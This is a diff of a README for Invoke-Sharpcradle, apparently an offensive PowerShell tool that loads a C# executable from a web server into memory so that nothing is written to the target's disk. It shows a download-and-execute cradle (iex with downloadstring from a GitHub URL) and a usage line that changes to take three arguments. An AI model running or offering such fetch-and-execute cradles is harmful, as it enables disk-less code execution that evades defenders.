@@ -7,6 +7,6 @@ Why? No executable on the target system hard disk. Powershell in memory, C# code
 
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')`
 
-`Invoke-Sharpcradle -Uri WebserverURI -Arguments ExecutableArguments`
+`Invoke-Sharpcradle -Uri WebserverURI -Argument1 firstargument -Argument2 seccondargument -Argument3 thirdargument`
 
 ![alt text](https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.png)
